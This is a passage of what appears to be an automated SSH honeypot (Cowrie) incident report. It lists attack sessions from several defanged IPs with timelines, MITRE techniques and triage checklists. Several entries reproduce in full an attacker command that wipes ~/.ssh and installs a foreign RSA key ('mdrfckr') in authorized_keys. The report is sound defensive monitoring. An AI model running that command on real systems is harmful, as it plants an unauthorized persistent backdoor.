| **First Seen** | 2026-06-04 18:27 |
| **Last Seen** | 2026-06-04 18:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:27:45` | `cowrie.session.connect` |
| `2026-06-04 18:27:45` | `cowrie.client.version` |
| `2026-06-04 18:27:45` | `cowrie.client.kex` |
| `2026-06-04 18:27:46` | `cowrie.login.success` |
| `2026-06-04 18:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ddb8f6da70

| Field | Detail |
|---|---|
| **Source IP** | `187.140.5[.]12` |
| **First Seen** | 2026-06-04 18:30 |
| **Last Seen** | 2026-06-04 18:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:30:44` | `cowrie.session.connect` |
| `2026-06-04 18:30:44` | `cowrie.client.version` |
| `2026-06-04 18:30:44` | `cowrie.client.kex` |
| `2026-06-04 18:30:45` | `cowrie.login.success` |
| `2026-06-04 18:30:46` | `cowrie.session.params` |
| `2026-06-04 18:30:46` | `cowrie.command.input` |
| `2026-06-04 18:30:46` | `cowrie.command.failed` |
| `2026-06-04 18:30:46` | `cowrie.log.closed` |
| `2026-06-04 18:30:47` | `cowrie.session.params` |
| `2026-06-04 18:30:47` | `cowrie.command.input` |
| `2026-06-04 18:30:47` | `cowrie.session.file_download` |
| `2026-06-04 18:30:47` | `cowrie.log.closed` |
| `2026-06-04 18:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.140.5[.]12` to AbuseIPDB if not already reported
- [ ] Block `187.140.5[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d821a300be7

| Field | Detail |
|---|---|
| **Source IP** | `187.140.5[.]12` |
| **First Seen** | 2026-06-04 18:30 |
| **Last Seen** | 2026-06-04 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:30:50` | `cowrie.session.connect` |
| `2026-06-04 18:30:50` | `cowrie.client.version` |
| `2026-06-04 18:30:51` | `cowrie.client.kex` |
| `2026-06-04 18:30:52` | `cowrie.login.success` |
| `2026-06-04 18:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.140.5[.]12` to AbuseIPDB if not already reported
- [ ] Block `187.140.5[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57723ff08b8

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:32 |
| **Last Seen** | 2026-06-04 18:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:32:52` | `cowrie.session.connect` |
| `2026-06-04 18:32:52` | `cowrie.client.version` |
| `2026-06-04 18:32:52` | `cowrie.client.kex` |
| `2026-06-04 18:32:53` | `cowrie.login.success` |
| `2026-06-04 18:32:53` | `cowrie.session.params` |
| `2026-06-04 18:32:53` | `cowrie.command.input` |
| `2026-06-04 18:32:53` | `cowrie.command.failed` |
| `2026-06-04 18:32:53` | `cowrie.log.closed` |
| `2026-06-04 18:32:53` | `cowrie.session.params` |
| `2026-06-04 18:32:53` | `cowrie.command.input` |
| `2026-06-04 18:32:53` | `cowrie.session.file_download` |
| `2026-06-04 18:32:53` | `cowrie.log.closed` |
| `2026-06-04 18:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a2d1c9b76a1

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:32 |
| **Last Seen** | 2026-06-04 18:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:32:55` | `cowrie.session.connect` |
| `2026-06-04 18:32:55` | `cowrie.client.version` |
| `2026-06-04 18:32:55` | `cowrie.client.kex` |
| `2026-06-04 18:32:55` | `cowrie.login.success` |
| `2026-06-04 18:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4410fdfdf9c2

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:33 |
| **Last Seen** | 2026-06-04 18:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:33:39` | `cowrie.session.connect` |
| `2026-06-04 18:33:39` | `cowrie.client.version` |
| `2026-06-04 18:33:40` | `cowrie.client.kex` |
| `2026-06-04 18:33:40` | `cowrie.login.success` |
| `2026-06-04 18:33:40` | `cowrie.session.params` |
| `2026-06-04 18:33:40` | `cowrie.command.input` |
| `2026-06-04 18:33:40` | `cowrie.command.failed` |
| `2026-06-04 18:33:41` | `cowrie.log.closed` |
| `2026-06-04 18:33:41` | `cowrie.session.params` |
| `2026-06-04 18:33:41` | `cowrie.command.input` |
| `2026-06-04 18:33:41` | `cowrie.session.file_download` |
| `2026-06-04 18:33:41` | `cowrie.log.closed` |
| `2026-06-04 18:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5222ed16a4

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:33 |
| **Last Seen** | 2026-06-04 18:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:33:43` | `cowrie.session.connect` |
| `2026-06-04 18:33:43` | `cowrie.client.version` |
| `2026-06-04 18:33:43` | `cowrie.client.kex` |
| `2026-06-04 18:33:44` | `cowrie.login.success` |
| `2026-06-04 18:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663cc24f7803

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:35 |
| **Last Seen** | 2026-06-04 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:35:47` | `cowrie.session.connect` |
| `2026-06-04 18:35:47` | `cowrie.client.version` |
| `2026-06-04 18:35:47` | `cowrie.client.kex` |
| `2026-06-04 18:35:47` | `cowrie.login.success` |
| `2026-06-04 18:35:48` | `cowrie.session.params` |
| `2026-06-04 18:35:48` | `cowrie.command.input` |
| `2026-06-04 18:35:48` | `cowrie.command.failed` |
| `2026-06-04 18:35:48` | `cowrie.log.closed` |
| `2026-06-04 18:35:48` | `cowrie.session.params` |
| `2026-06-04 18:35:48` | `cowrie.command.input` |
| `2026-06-04 18:35:48` | `cowrie.session.file_download` |
| `2026-06-04 18:35:48` | `cowrie.log.closed` |
| `2026-06-04 18:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00375361aac5

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:35 |
| **Last Seen** | 2026-06-04 18:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:35:49` | `cowrie.session.connect` |
| `2026-06-04 18:35:49` | `cowrie.client.version` |
| `2026-06-04 18:35:50` | `cowrie.client.kex` |
| `2026-06-04 18:35:50` | `cowrie.login.success` |
| `2026-06-04 18:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3414a819a635

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:37 |
| **Last Seen** | 2026-06-04 18:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:37:35` | `cowrie.session.connect` |
| `2026-06-04 18:37:35` | `cowrie.client.version` |
| `2026-06-04 18:37:35` | `cowrie.client.kex` |
| `2026-06-04 18:37:36` | `cowrie.login.success` |
| `2026-06-04 18:37:36` | `cowrie.session.params` |
| `2026-06-04 18:37:36` | `cowrie.command.input` |
| `2026-06-04 18:37:36` | `cowrie.command.failed` |
| `2026-06-04 18:37:36` | `cowrie.log.closed` |
| `2026-06-04 18:37:37` | `cowrie.session.params` |
| `2026-06-04 18:37:37` | `cowrie.command.input` |
| `2026-06-04 18:37:37` | `cowrie.session.file_download` |
| `2026-06-04 18:37:37` | `cowrie.log.closed` |
| `2026-06-04 18:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6754a931699f

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:37 |
| **Last Seen** | 2026-06-04 18:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:37:39` | `cowrie.session.connect` |
| `2026-06-04 18:37:39` | `cowrie.client.version` |
| `2026-06-04 18:37:39` | `cowrie.client.kex` |
| `2026-06-04 18:37:40` | `cowrie.login.success` |
| `2026-06-04 18:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26bbb11b4bfb

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:39 |
| **Last Seen** | 2026-06-04 18:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:39:33` | `cowrie.session.connect` |
| `2026-06-04 18:39:33` | `cowrie.client.version` |
| `2026-06-04 18:39:33` | `cowrie.client.kex` |
| `2026-06-04 18:39:33` | `cowrie.login.success` |
| `2026-06-04 18:39:34` | `cowrie.session.params` |
| `2026-06-04 18:39:34` | `cowrie.command.input` |
| `2026-06-04 18:39:34` | `cowrie.command.failed` |
| `2026-06-04 18:39:34` | `cowrie.log.closed` |
| `2026-06-04 18:39:34` | `cowrie.session.params` |
| `2026-06-04 18:39:34` | `cowrie.command.input` |
| `2026-06-04 18:39:34` | `cowrie.session.file_download` |
| `2026-06-04 18:39:34` | `cowrie.log.closed` |
| `2026-06-04 18:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d7463a50b1

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:39 |
| **Last Seen** | 2026-06-04 18:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:39:36` | `cowrie.session.connect` |
| `2026-06-04 18:39:36` | `cowrie.client.version` |
| `2026-06-04 18:39:36` | `cowrie.client.kex` |
| `2026-06-04 18:39:37` | `cowrie.login.success` |
| `2026-06-04 18:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0920e7f23efa

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:41 |
| **Last Seen** | 2026-06-04 18:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:41:29` | `cowrie.session.connect` |
| `2026-06-04 18:41:29` | `cowrie.client.version` |
| `2026-06-04 18:41:29` | `cowrie.client.kex` |
| `2026-06-04 18:41:30` | `cowrie.login.success` |
| `2026-06-04 18:41:30` | `cowrie.session.params` |
| `2026-06-04 18:41:30` | `cowrie.command.input` |
| `2026-06-04 18:41:30` | `cowrie.command.failed` |
| `2026-06-04 18:41:30` | `cowrie.log.closed` |
| `2026-06-04 18:41:30` | `cowrie.session.params` |
| `2026-06-04 18:41:30` | `cowrie.command.input` |
| `2026-06-04 18:41:30` | `cowrie.session.file_download` |
| `2026-06-04 18:41:30` | `cowrie.log.closed` |
| `2026-06-04 18:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5299c730593

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:41 |
| **Last Seen** | 2026-06-04 18:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:41:32` | `cowrie.session.connect` |
| `2026-06-04 18:41:32` | `cowrie.client.version` |
| `2026-06-04 18:41:32` | `cowrie.client.kex` |
| `2026-06-04 18:41:32` | `cowrie.login.success` |
| `2026-06-04 18:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d510aa52cd0

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:47 |
| **Last Seen** | 2026-06-04 18:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:47:11` | `cowrie.session.connect` |
| `2026-06-04 18:47:11` | `cowrie.client.version` |
| `2026-06-04 18:47:11` | `cowrie.client.kex` |
| `2026-06-04 18:47:12` | `cowrie.login.success` |
| `2026-06-04 18:47:12` | `cowrie.session.params` |
| `2026-06-04 18:47:12` | `cowrie.command.input` |
| `2026-06-04 18:47:12` | `cowrie.command.failed` |
| `2026-06-04 18:47:12` | `cowrie.log.closed` |
| `2026-06-04 18:47:12` | `cowrie.session.params` |
| `2026-06-04 18:47:12` | `cowrie.command.input` |
| `2026-06-04 18:47:12` | `cowrie.session.file_download` |
| `2026-06-04 18:47:12` | `cowrie.log.closed` |
| `2026-06-04 18:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497627fe332e

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:47 |
| **Last Seen** | 2026-06-04 18:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:47:14` | `cowrie.session.connect` |
| `2026-06-04 18:47:14` | `cowrie.client.version` |
| `2026-06-04 18:47:14` | `cowrie.client.kex` |
| `2026-06-04 18:47:14` | `cowrie.login.success` |
| `2026-06-04 18:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-883317a784b7

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:53 |
| **Last Seen** | 2026-06-04 18:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
